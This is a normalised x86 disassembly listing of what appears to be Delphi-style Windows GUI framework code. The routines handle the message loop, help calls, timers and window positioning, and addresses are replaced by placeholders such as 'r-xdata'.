mov eax [ ebp - 0x10 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call GetParent
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_424d70
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0xc4 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_425dc0
sub_424db0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_434714
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov bx 0xffaf
call sub_44c24c
test al al
jne r-xdata
sub_424e30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
push 0x1
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x12
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8c ] 0x1
mov [ ebp - 0xa ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_424d70
test al al
jne r-xdata
lea ecx [ ebp - 0xa ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
cmp [ ebp - 0xa ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_424bf0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_424c5c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_424bb0
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
call TranslateMessage
mov eax [ ebp - 0x8 ]
push eax
call DispatchMessageA
jmp r-xdata
sub_424ef8
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_424e30
test al al
jne r-xdata
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_425804
sub_424f20
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x98 ]
call sub_43c418
mov eax 0x8
call sub_44ba5c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x98 ]
call sub_43c264
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn 0x8
lea eax [ ebp + 0x8 ]
push eax
push 0x0
push 0xb020
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SendMessageA
jmp r-xdata
sub_424f98
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x98 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x8
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0xb020
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SendMessageA
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0xc ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x98 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
mov eax [ ebp - 0xc ]
call sub_44ba74
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x98 ]
call sub_43c2dc
jmp r-xdata
sub_425048
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_425068
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call [ eax - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
xor eax eax
push ebp
push sub_4250b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
or edx 0xffffffff
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_4346dc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x38 ] edx
sub_4250fc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x95 ] 0x1
xor eax eax
push ebp
push sub_4251b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax sub_41a004
call sub_446130
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4251bd
mov eax [ ebp - 0x4 ]
mov [ eax + 0x95 ] 0x0
retn
mov eax [ rw-data ]
mov eax [ eax ]
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov dl 0x2
call sub_41ead0
sub eax 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_424ef8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x213 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ eax + 0x213 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov dl 0x1
call sub_41d71c
mov eax [ ebp - 0x4 ]
call sub_424854
jmp r-xdata
sub_4251dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
call GetCapture
test eax eax
je r-xdata
call sub_447768
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_447790
push eax
call sub_447768
pop edx
call sub_447978
call sub_447768
mov edx [ r-xdata ]
call sub_44c1e8
test al al
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xba ] 0x0
je r-xdata
call sub_447768
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4253d4
jmp r-xdata
call sub_447768
mov ecx eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
jmp r-xdata
sub_42527c
push ebp
mov ebp esp
add esp 0xffffffa8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
call GetActiveWindow
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x1c ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x20 ]
je r-xdata
xor eax eax
call sub_41a0b0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
call sub_423fe8
test al al
je r-xdata
mov [ ebp - 0x48 ] 0x28
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov eax [ ebp - 0x38 ]
sub eax [ ebp - 0x40 ]
sar eax 0x1
jns r-xdata
xor eax eax
push ebp
push sub_4253c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call MessageBoxA
mov [ ebp - 0x10 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4253ca
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x20 ]
je r-xdata
or [ ebp + 0x8 ] 0x100000
add eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x44 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0x18 ]
call sub_41a168
mov eax [ ebp - 0x14 ]
push eax
call SetActiveWindow
retn
push 0x1d
push 0x0
push 0x0
mov eax [ ebp - 0x4c ]
sub eax [ ebp - 0x54 ]
sar eax 0x1
jns r-xdata
add eax [ ebp - 0x44 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetWindowPos
adc eax 0x0
add eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x50 ]
sub eax [ ebp - 0x58 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add eax [ ebp - 0x58 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetWindowPos
adc eax 0x0
sub_4253d4
push ebp
mov ebp esp
add esp 0xfffffef0
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425494
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
call sub_44cb78
cmp [ ebp - 0xc ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
call sub_424ab8
mov eax [ ebp - 0x110 ]
call sub_44cf24
push eax
mov eax [ ebp - 0xc ]
call sub_44cf24
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_42527c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42549b
lea eax [ ebp - 0x110 ]
call sub_44cae0
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
mov eax [ ebp - 0xc ]
call sub_4465f4
mov edx eax
lea eax [ ebp - 0x10c ]
call sub_44be7c
lea eax [ ebp - 0x10c ]
mov edx r-xdata
call sub_44bc9c
jbe r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_44cd68
sub_4254b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0xe ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xca ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x292 ] 0x0
je r-xdata
cmp [ ebp - 0xe ] 0x0
je r-xdata
lea eax [ ebp - 0xe ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov dx [ ebp - 0x6 ]
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
mov [ ebp - 0xd ] al
lea eax [ ebp - 0xe ]
push eax
mov ebx [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov dx [ ebp - 0x6 ]
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
mov [ ebp - 0xd ] al
jmp r-xdata
mov al [ ebp - 0xd ]
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x224 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
push 0xb01f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call PostMessageA
mov eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x14 ]
push eax
call WinHelpA
neg eax
sbb eax eax
neg eax
mov [ ebp - 0xd ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_434714
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
call sub_434714
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x224 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x14 ]
push eax
call WinHelpA
neg eax
sbb eax eax
neg eax
mov [ ebp - 0xd ] al
jmp r-xdata
sub_425610
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov dx 0x1
mov eax [ ebp - 0x4 ]
call sub_4254b0
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_425638
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov dx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4254b0
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn
sub_425660
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x78 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x78 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x74 ] edx
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_42cc88
jmp r-xdata
sub_4256c8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_42282c
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_434714
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_422808
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_434714
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_425744
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x14 ]
mov dl 0x1
call sub_42ac70
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
call sub_4291a0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
call sub_42df28
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
call sub_42df28
sub_425804
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4258f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_425744
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_423550
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
call sub_42914c
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4259d4
mov [ ebp - 0x9 ] 0x1
xor eax eax
push ebp
push sub_4258bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xda ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3c ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
lea ecx [ ebp - 0x9 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
mov eax [ ebp - 0x4 ]
call sub_425dc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4256c8
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258ff
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_44cb04
retn
call WaitMessage
sub_425908
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4227ec
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
push 0x0
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4227c8
movzx edx [ ebp - 0x6 ]
xor ecx ecx
call sub_42df28
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
sub_425958
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42481c
push eax
push 0x1
push 0x80
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_42481c
push eax
push 0xfffffff2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax [ ebp - 0x4 ]
call sub_425908
pop ecx
pop ecx
pop ebp
retn
push 0xffffffff
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call InvalidateRect
sub_4259d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov edx [ ebp - 0x8 ]
call sub_44ce70
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x44
mov edx [ ebp - 0x8 ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd2 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4024bc
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_404e1c
xor eax eax
push ebp
push sub_425a71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov bx 0xfff0
call sub_44c24c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_44c070
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_425a80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call IsWindowVisible
neg eax
sbb eax eax
neg eax
cmp al [ rw-data ]
jne r-xdata
pop ecx
pop ebp
retn
mov al [ rw-data ]
cmp al [ ebp - 0x1 ]
je r-xdata
xor eax eax
mov al [ ebp - 0x1 ]
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
call SetWindowPos
mov al [ ebp - 0x1 ]
mov [ rw-data ] al
sub_425ae0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_4227ec
dec eax
test eax eax
jl r-xdata
push ebp
xor eax eax
call sub_425a80
pop ecx
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4227c8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_425a80
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_434bd8
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x164 ]
push eax
mov eax [ ebp - 0xc ]
call sub_434714
push eax
call IsChild
test eax eax
jne r-xdata
sub_425b80
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_425bd0
push sub_4235e0
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
call SetTimer
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7a ] ax
mov al [ ebp - 0x9 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x79 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x7a ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_425dc0
sub_425bd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x7a ]
push eax
push 0x0
call KillTimer
mov eax [ ebp - 0x4 ]
mov [ eax + 0x7a ] 0x0
sub_425bfc
push ebp
mov ebp esp
add esp 0xffffffd0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
call sub_444534
lea edx [ ebp - 0x30 ]
lea ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_42c3a8
lea eax [ ebp - 0x28 ]
mov dl 0x1
call sub_42ac70
call sub_423598
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_425dc0
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x89 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x50 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x48 ]
mov [ ebp - 0x15 ] al
cmp [ ebp - 0x15 ] 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
call sub_444534
lea edx [ ebp - 0x30 ]
